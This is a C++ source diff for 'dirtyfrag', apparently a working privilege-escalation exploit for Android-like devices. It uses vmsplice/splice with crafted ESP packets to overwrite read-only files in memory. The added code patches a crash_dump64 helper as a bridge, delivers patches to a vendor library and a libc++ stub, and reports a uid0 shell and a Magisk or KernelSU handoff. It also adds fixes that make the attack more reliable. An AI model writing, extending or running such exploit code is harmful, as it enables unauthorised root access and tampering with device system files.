@@ -29,6 +29,7 @@
 #include <arpa/inet.h>
 #include <string>
 #include <sys/socket.h>
+#include <sys/mman.h>
 #include <sys/stat.h>
 #include <sys/un.h>
 #include <sys/wait.h>
@@ -50,6 +51,19 @@ namespace ghostlock::session {
             uint32_t spi = 0;
             std::vector<dirty_entry> patch;
             std::vector<dirty_entry> restore;
+            /* Module pipeline: the crash_dump bridge. `aux_lib` is crash_dump64;
+             * aux_patch installs the helper (a separate aux-install run),
+             * aux_restore removes it; `vendor_lib` is the vendor_file target,
+             * whose bytes are delivered through the bridge (one splice feeds
+             * every vendor patch packet). */
+            std::string aux_lib;
+            std::vector<dirty_entry> aux_patch;
+            std::vector<dirty_entry> aux_restore;
+            bool aux_installed = false;
+            std::string bridge;
+            std::string vendor_lib;
+            uint64_t vendor_len = 0;
+            std::vector<dirty_entry> vendor_patch;
         };
 
         bool parse_hex16(const char *text, uint8_t out[16]) {
@@ -91,7 +105,26 @@ namespace ghostlock::session {
                 } else if (std::strcmp(key, "socket") == 0) {
                     const char *value = strtok_r(nullptr, " \t\r\n", &save);
                     if (value != nullptr) plan->socket_name = value;
-                } else if (std::strcmp(key, "patch") == 0 || std::strcmp(key, "restore") == 0) {
+                } else if (std::strcmp(key, "alib") == 0) {
+                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
+                    if (value != nullptr) plan->aux_lib = value;
+                } else if (std::strcmp(key, "bridge") == 0) {
+                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
+                    if (value != nullptr) plan->bridge = value;
+                } else if (std::strcmp(key, "vlib") == 0) {
+                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
+                    if (value != nullptr) plan->vendor_lib = value;
+                } else if (std::strcmp(key, "vlen") == 0) {
+                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
+                    if (value != nullptr) {
+                        plan->vendor_len = static_cast<uint64_t>(std::strtoull(value, nullptr, 10));
+                    }
+                } else if (std::strcmp(key, "auxinstalled") == 0) {
+                    const char *value = strtok_r(nullptr, " \t\r\n", &save);
+                    plan->aux_installed = value != nullptr && std::atoi(value) != 0;
+                } else if (std::strcmp(key, "patch") == 0 || std::strcmp(key, "restore") == 0 ||
+                           std::strcmp(key, "apatch") == 0 || std::strcmp(key, "arestore") == 0 ||
+                           std::strcmp(key, "vpatch") == 0) {
                     const char *off = strtok_r(nullptr, " \t\r\n", &save);
                     const char *iv = strtok_r(nullptr, " \t\r\n", &save);
                     dirty_entry entry{};
@@ -102,7 +135,13 @@ namespace ghostlock::session {
                         return false;
                     }
                     entry.offset = static_cast<off_t>(std::strtoll(off, nullptr, 10));
-                    (std::strcmp(key, "patch") == 0 ? plan->patch : plan->restore).push_back(entry);
+                    std::vector<dirty_entry> *target = nullptr;
+                    if (std::strcmp(key, "patch") == 0) target = &plan->patch;
+                    else if (std::strcmp(key, "restore") == 0) target = &plan->restore;
+                    else if (std::strcmp(key, "apatch") == 0) target = &plan->aux_patch;
+                    else if (std::strcmp(key, "arestore") == 0) target = &plan->aux_restore;
+                    else target = &plan->vendor_patch;
+                    target->push_back(entry);
                 }
             }
             std::fclose(file);
@@ -112,6 +151,31 @@ namespace ghostlock::session {
                 return false;
             }
             return true;
+        }
+
+        /* One stable, page-aligned header slot per packet.
+         *
+         * The packet's 24-byte ESP header must not be reused: the skb keeps a
+         * pipe reference to the page and the ESP input reads it when the
+         * loopback softirq processes the packet, which can be after the stage
+         * has moved on. A stack buffer is overwritten by the next packet; with
+         * a burst (the module's ~850 packets) that leaves the queued headers
+         * holding the last write, so the SA lookup/decrypt sees the wrong
+         * sequence/IV and the block is dropped. The reference's one-process-per-
+         * block cadence masked this. */
+        uint8_t *header_slot() {
+            constexpr std::size_t kSlot = 4096;
+            constexpr std::size_t kSlots = 4096; // 16 MiB: enough for the largest plan
+            static uint8_t *arena = nullptr;
+            static std::size_t used = 0;
+            if (arena == nullptr) {
+                void *mapped = mmap(nullptr, kSlot * kSlots, PROT_READ | PROT_WRITE,
+                                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+                if (mapped == MAP_FAILED) return nullptr;
+                arena = static_cast<uint8_t *>(mapped);
+            }
+            if (used >= kSlots) return nullptr;
+            return arena + (used++) * kSlot;
         }
 
         int send_one(int socket_fd, int file_fd, const dirty_entry &entry, uint32_t spi,
@@ -125,10 +189,17 @@ namespace ghostlock::session {
 
             int pipe_fds[2];
             if (pipe(pipe_fds) < 0) return -errno;
+            uint8_t *slot = header_slot();
+            if (slot == nullptr) {
+                close(pipe_fds[0]);
+                close(pipe_fds[1]);
+                return -ENOMEM;
+            }
+            std::memcpy(slot, header, sizeof(header));
             struct iovec iov{};
-            iov.iov_base = header;
+            iov.iov_base = slot;
             iov.iov_len = sizeof(header);
-            if (vmsplice(pipe_fds[1], &iov, 1, SPLICE_F_GIFT) != 24) {
+            if (vmsplice(pipe_fds[1], &iov, 1, 0) != 24) {
                 const int err = -errno;
                 close(pipe_fds[0]);
                 close(pipe_fds[1]);
@@ -145,6 +216,85 @@ namespace ghostlock::session {
             const int result = (sent == 40) ? 0 : (sent < 0 ? -errno : -1000);
             close(pipe_fds[0]);
             close(pipe_fds[1]);
+            return result;
+        }
+
+        /* The module pipeline's vendor delivery: one helper invocation splices
+         * the whole vendor range into a pipe; each packet then takes its 16
+         * bytes from that pipe (the page reference survives pipe-to-pipe), so
+         * the app never needs read/write access to vendor_file itself. */
+        int send_vendor_range(int socket_fd, const dirty_plan &plan, uint32_t spi,
+                              uint32_t &sequence) {
+            if (plan.vendor_patch.empty()) return 0;
+            if (plan.bridge.empty() || plan.vendor_lib.empty() || plan.vendor_len == 0) return -1;
+            int feed[2];
+            if (pipe(feed) < 0) return -errno;
+            const pid_t pid = fork();
+            if (pid == 0) {
+                if (dup2(feed[1], 1) < 0) _exit(1);
+                close(feed[0]);
+                close(feed[1]);
+                char len_text[24];
+                std::snprintf(len_text, sizeof(len_text), "%llu",
+                              static_cast<unsigned long long>(plan.vendor_len));
+                execl(plan.bridge.c_str(), "crashdump64", "0", plan.vendor_lib.c_str(), "s",
+                      len_text, static_cast<char *>(nullptr));
+                _exit(1);
+            }
+            close(feed[1]);
+            if (pid < 0) {
+                close(feed[0]);
+                return -errno;
+            }
+            int32_t result = 0;
+            for (const dirty_entry &entry : plan.vendor_patch) {
+                uint8_t header[24];
+                const uint32_t spi_be = htonl(spi);
+                const uint32_t seq_be = htonl(sequence);
+                std::memcpy(header, &spi_be, 4);
+                std::memcpy(header + 4, &seq_be, 4);
+                std::memcpy(header + 8, entry.iv, 16);
+                int packet[2];
+                if (pipe(packet) < 0) {
+                    result = -errno;
+                    break;
+                }
+                uint8_t *slot = header_slot();
+                if (slot == nullptr) {
+                    result = -ENOMEM;
+                    close(packet[0]);
+                    close(packet[1]);
+                    break;
+                }
+                std::memcpy(slot, header, sizeof(header));
+                struct iovec iov{};
+                iov.iov_base = slot;
+                iov.iov_len = sizeof(header);
+                if (vmsplice(packet[1], &iov, 1, 0) != 24 ||
+                    splice(feed[0], nullptr, packet[1], nullptr, 16, SPLICE_F_MOVE) != 16) {
+                    result = -errno;
+                    close(packet[0]);
+                    close(packet[1]);
+                    break;
+                }
+                const ssize_t sent = splice(packet[0], nullptr, socket_fd, nullptr, 40, 0);
+                close(packet[0]);
+                close(packet[1]);
+                if (sent != 40) {
+                    result = sent < 0 ? -errno : -1000;
+                    break;
+                }
+                sequence++;
+                /* The encapsulated ESP packets are processed asynchronously;
+                 * the encap socket's receive buffer is finite. The reference's
+                 * per-block process spawn paced this naturally; a tight burst
+                 * overflows the queue and the later blocks are dropped. */
+                if ((sequence % 96) == 0) usleep(10 * 1000);
+            }
+            close(feed[0]);
+            int32_t status = 0;
+            waitpid(pid, &status, 0);
+            if (result == 0 && (!WIFEXITED(status) || WEXITSTATUS(status) != 0)) result = -1001;
             return result;
         }
 
@@ -260,6 +410,38 @@ namespace ghostlock::session {
         };
         dirty_plan plan{};
         if (!load_plan(control_path, &plan)) return 1;
+        /* Step 1 of the module pipeline: install the crash_dump helper only. */
+        if (mode != nullptr && std::strcmp(mode, "aux-install") == 0) {
+            if (plan.aux_lib.empty() || plan.aux_patch.empty()) {
+                std::fprintf(stderr, "dirtyfrag: aux-install: no aux plan\n");
+                return 1;
+            }
+            const int aux_fd = open(plan.aux_lib.c_str(), O_RDONLY);
+            if (aux_fd < 0) {
+                std::fprintf(stderr, "dirtyfrag: aux-install: cannot open %s errno=%d\n",
+                             plan.aux_lib.c_str(), errno);
+                return 1;
+            }
+            const int aux_sender = open_sender(plan);
+            if (aux_sender < 0) {
+                close(aux_fd);
+                std::fprintf(stderr, "dirtyfrag: aux-install: sender socket failed errno=%d\n", errno);
+                return 1;
+            }
+            uint32_t aux_sequence = 1;
+            int32_t aux_rc = 0;
+            for (const dirty_entry &entry : plan.aux_patch) {
+                const int result = send_one(aux_sender, aux_fd, entry, plan.spi, aux_sequence++);
+                if (result != 0) {
+                    aux_rc = result;
+                    break;
+                }
+            }
+            close(aux_sender);
+            close(aux_fd);
+            std::printf("dirtyfrag: aux-install blocks=%zu rc=%d\n", plan.aux_patch.size(), aux_rc);
+            return aux_rc == 0 ? 0 : 1;
+        }
         const bool no_shell = (mode != nullptr && std::strcmp(mode, "noshell") == 0);
         const bool no_script = (mode != nullptr && std::strcmp(mode, "noscript") == 0);
         /* Diagnostic A/B arm: the old behaviour (restore after the root
@@ -282,8 +464,41 @@ namespace ghostlock::session {
             return 1;
         }
 
-        uint32_t sequence = 1;
+        /* One monotonic sequence for every packet of this stage. The install
+         * run already used 1..N on the same SA; a high base keeps the replay
+         * window from treating the main run's packets as duplicates. */
+        uint32_t sequence = 100000;
         bool ok = true;
+        /* Module pipeline: the vendor target first (through the bridge that the
+         * aux-install run left in crash_dump64), then remove the bridge, then
+         * the libc++ stub. The vendor file stays patched until reboot (an
+         * unused vendor library; the bridge is restored). */
+        if (!plan.vendor_patch.empty()) {
+            const int vendor_rc = send_vendor_range(sender, plan, plan.spi, sequence);
+            std::printf("dirtyfrag: T+%lldms vendor blocks=%zu rc=%d\n",
+                        static_cast<long long>(stage_ms()), plan.vendor_patch.size(), vendor_rc);
+            if (vendor_rc != 0) ok = false;
+            /* Let the encap queue drain before the bridge restore and the
+             * libc++ stub share the same queue. */
+            if (ok) usleep(30 * 1000);
+        }
+        if (ok && plan.aux_installed && !plan.aux_restore.empty()) {
+            const int aux_fd = open(plan.aux_lib.c_str(), O_RDONLY);
+            if (aux_fd >= 0) {
+                for (const dirty_entry &entry : plan.aux_restore) {
+                    if (send_one(sender, aux_fd, entry, plan.spi, sequence++) != 0) {
+                        ok = false;
+                        break;
+                    }
+                }
+                close(aux_fd);
+                std::printf("dirtyfrag: T+%lldms aux restored\n", static_cast<long long>(stage_ms()));
+            } else {
+                std::fprintf(stderr, "dirtyfrag: aux restore: cannot open %s errno=%d\n",
+                             plan.aux_lib.c_str(), errno);
+                ok = false;
+            }
+        }
         for (const dirty_entry &entry : plan.patch) {
             const int result = send_one(sender, file_fd, entry, plan.spi, sequence++);
             if (result != 0) {
@@ -398,6 +613,35 @@ namespace ghostlock::session {
                 std::fprintf(stderr, "dirtyfrag: root script exited code=%d\n", script_rc);
                 ok = false;
             }
+        }
+
+        /* The module pipeline's handoff is Magisk, not KernelSU: report it as
+         * its own verdict line so the run log names the daemon, the policy
+         * phase and the delivered target the way the KSU path names its
+         * late-load. It is printed even when the init shell never connected,
+         * so a handoff that did not happen is named as such. The final
+         * enforce state still comes from RESULT. */
+        if (!no_script && config::runtime_config_snapshot().handoff == "magisk") {
+            dirtyfrag_verdict::MagiskSummary magisk{};
+            const bool reported = shell_uid0 &&
+                dirtyfrag_verdict::parse_magisk_summary(script_output, &magisk);
+            const char *reason = !shell_uid0
+                                     ? "no-shell"
+                                     : (!reported ? "no-summary"
+                                                  : (magisk.ready() ? "ok" : "magiskd-none"));
+            const auto &runtime = config::runtime_config_snapshot();
+            std::printf(
+                "dirtyfrag: T+%lldms MAGISK-HANDOFF %s reason=%s magiskd=%s policy=%s "
+                "policy_rc=%s enforce=%s bin=%s module=%s\n",
+                static_cast<long long>(stage_ms()),
+                magisk.ready() ? "ok" : "fail",
+                reason,
+                reported ? magisk.magiskd.c_str() : "none",
+                reported ? magisk.policy.c_str() : "none",
+                reported ? magisk.policy_rc.c_str() : "none",
+                reported ? magisk.enforce.c_str() : "unknown",
+                runtime.magisk_bin.c_str(),
+                plan.vendor_lib.empty() ? "none" : plan.vendor_lib.c_str());
         }
 
         /* Probe after the script, whatever its verdict: a run whose root phase
